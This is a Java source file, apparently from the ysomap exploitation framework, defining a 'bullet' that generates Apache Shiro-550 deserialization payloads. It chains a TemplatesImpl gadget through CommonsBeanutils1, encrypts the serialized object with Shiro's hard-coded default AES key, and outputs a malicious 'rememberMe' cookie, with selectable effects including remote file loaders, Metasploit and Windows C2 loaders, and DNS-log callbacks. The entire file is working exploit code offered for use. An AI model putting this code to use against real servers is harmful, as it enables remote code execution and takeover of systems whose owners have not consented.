package ysomap.bullets.shiro;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.TemplatesImplBullet;
import ysomap.common.annotation.*;
import ysomap.common.util.Strings;
import ysomap.core.serializer.SerializerFactory;
import ysomap.core.util.CipherHelper;
import ysomap.core.util.DetailHelper;
import ysomap.payloads.Payload;
import ysomap.payloads.java.commons.beanutils.CommonsBeanutils1;

import java.security.SecureRandom;
import java.util.Base64;

@Bullets
@Authors({Authors.M01E})
@Details("用于Shiro-550反序列化漏洞代码执行")
@Targets({Targets.SHIRO})
@Dependencies({"shiro"})
public class TemplatesImplShiroBullet extends AbstractBullet<Object> {

    @Require(name = "key", detail = "设置shiro AES Key，如果为空，则使用默认key")
    public String key = null;

    @NotNull
    @Require(name = "body" ,detail = DetailHelper.BODY)
    private String body = "";

    @NotNull
    @Require(name = "effect", type = "string", detail="选择载入payload的效果，" +
            "可选default、SpecialRuntimeExecutor、" +
            "TomcatEchoMin、SocketEcho、RemoteFileLoader、WinC2Loader、MSFJavaC2Loader、" +
            "RemoteFileHttpLoader、RemoteFileHttpExecutor、DnslogLoader、CustomizableClassLoader")
    private String effect = "default";

    @Require(name = "exception", type = "boolean", detail = "是否需要以抛异常的方式返回执行结果，默认为false")
    private String exception = "false";

    @Override
    public Object getObject() throws Exception {
        Bullet bullet = new TemplatesImplBullet();
        if (key == null) {
            key = DEFAULT_KEY;
        }
        bullet.set("body", body);
        bullet.set("effect", effect);
        bullet.set("exception", exception);
        TemplatesImpl templates = (TemplatesImpl) bullet.getObject();

        CommonsBeanutils1 cb1 = new CommonsBeanutils1();
        cb1.setBullet(bullet);
        Object obj = cb1.pack(templates);

        String encrypted = doEncrypt(key, obj);
        return "rememberMe=" + encrypted;
    }

    private String doEncrypt(String key, Object obj) throws Exception {
        byte[] plainBytes = null;
        if(obj instanceof Payload){
            plainBytes = (byte[]) SerializerFactory.createSerializer("default").serialize((Payload) obj);
        }else{
            plainBytes = (byte[]) SerializerFactory.createSerializer("default").serialize(obj);
        }

        int ivSize = 16;
        byte[] ivBytes = new byte[ivSize];
        SecureRandom random = new SecureRandom();
        random.nextBytes(ivBytes);
        byte[] keyBytes = Base64.getDecoder().decode(key);
        byte[] encrypted = CipherHelper.encrypt(plainBytes, keyBytes, ivBytes);
        if(encrypted != null){
            byte[] packed = new byte[ivSize + encrypted.length];
            System.arraycopy(ivBytes, 0, packed, 0, ivSize);
            System.arraycopy(encrypted, 0, packed, ivSize, encrypted.length);
            return Strings.base64ToString(packed);
        }
        return null;
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new TemplatesImplShiroBullet();
        bullet.set("key", args[0]);
        bullet.set("effect", args[1]);
        bullet.set("body", args[2]);
        bullet.set("exception", args[3]);
        return bullet;
    }

    private static String DEFAULT_KEY = "kPH+bIxk5D2deZiIxcaaaA==";
}
